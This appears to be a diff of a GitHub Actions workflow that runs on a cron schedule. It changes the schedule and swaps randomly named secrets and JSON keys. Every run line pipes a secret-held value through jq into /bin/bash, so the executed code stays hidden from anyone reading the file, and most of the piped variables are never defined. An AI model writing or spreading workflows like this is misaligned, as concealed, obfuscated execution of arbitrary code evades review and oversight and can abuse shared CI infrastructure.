@@ -2,23 +2,21 @@ name: gaojinbao2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
+    - cron: '53 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaojinbao2345
         env:
-          z4: ${{ secrets.z4 }}
+          fa8: ${{ secrets.fa8 }}
         run: |
-          echo $z4 | jq -r .yvge3364 | /bin/bash
-          echo $rkst42 | jq -r .pffb57 | /bin/bash
-          echo $mzxd70 | jq -r .zgpm109 | /bin/bash
-          echo $hp891 | jq -r .pt97 | /bin/bash
-          echo $zm524 | jq -r .qmhi653 | /bin/bash
-          echo $boz2827 | jq -r .hfx12218 | /bin/bash
-          echo $rrhn6 | jq -r .i75 | /bin/bash
+          echo $fa8 | jq -r .smqno5735 | /bin/bash
+          echo $cq830 | jq -r .rt65 | /bin/bash
+          echo $lod470 | jq -r .prr075 | /bin/bash
+          echo $swszv776 | jq -r .twpru1871 | /bin/bash
+          echo $juq4146 | jq -r .fihxj013 | /bin/bash
+          echo $n3 | jq -r .zajr4562 | /bin/bash
 
